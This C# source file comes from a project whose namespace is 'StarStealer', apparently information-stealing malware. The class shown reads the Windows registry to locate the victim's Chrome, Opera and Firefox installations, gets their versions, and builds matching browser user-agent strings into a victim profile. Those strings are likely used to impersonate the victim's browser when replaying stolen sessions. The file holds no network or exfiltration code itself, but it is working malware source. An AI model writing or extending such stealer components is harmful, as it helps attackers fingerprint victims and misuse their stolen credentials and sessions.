using Microsoft.Win32;
using StarStealer.Entities;
using System;
using System.Diagnostics;
using System.Linq;

namespace StarStealer.Utilities
{
	internal class UserAgentGenerator
	{
		public static void Generate(ref User u)
		{
			string empty = string.Empty;
			string[] array = u.NT.Split('.');
			string text = string.Empty;
			if (array.Contains("10"))
			{
				text = "Windows NT 10.0";
			}
			if (array.Length > 1 && !array.Contains("10"))
			{
				text = "Windows NT " + array[0] + "." + array[1];
			}
			foreach (Browser browser in u.Browsers)
			{
				try
				{
					if (browser.Name.Equals("Google Chrome"))
					{
						object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
						if (value != null)
						{
							empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						else
						{
							value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
							empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						if (u.is64)
						{
							u.UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
						}
						else
						{
							u.UserAgents.Add("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
						}
					}
					if (browser.Name.Equals("Opera Browser"))
					{
						try
						{
							string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
							text2 = text2.Remove(text2.Length - 6, 6);
							text2 = text2.Remove(0, 1);
							empty = FileVersionInfo.GetVersionInfo(text2).FileVersion;
							string text3 = string.Empty;
							string empty2 = string.Empty;
							if (empty.Split('.').First().Equals("54"))
							{
								text3 = "67.0.3396.87";
							}
							if (empty.Split('.').First().Equals("55"))
							{
								text3 = "68.0.3440.106";
							}
							if (empty.Split('.').First().Equals("56"))
							{
								text3 = "69.0.3497.100";
							}
							if (empty.Split('.').First().Equals("57"))
							{
								text3 = "70.0.3538.102";
							}
							if (u.is64)
							{
								u.UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + text3 + " Safari/537.36 OPR/55.0.2994.44");
							}
							else
							{
								u.UserAgents.Add("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + text3 + " Safari/537.36 OPR/55.0.2994.44");
							}
						}
						catch (Exception item)
						{
							Program.Errors.Add(item);
						}
					}
					if (browser.Name.Equals("Mozilla Firefox"))
					{
						object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
						if (value2 != null)
						{
							empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						else
						{
							value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
							empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						string empty3 = string.Empty;
						empty3 = empty.Split('.').First() + "." + empty.Split('.')[1];
						if (u.is64)
						{
							u.UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
						}
						else
						{
							u.UserAgents.Add("Mozilla/5.0 (" + text + "; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
						}
					}
				}
				catch (Exception item2)
				{
					Program.Errors.Add(item2);
				}
			}
		}
	}
}
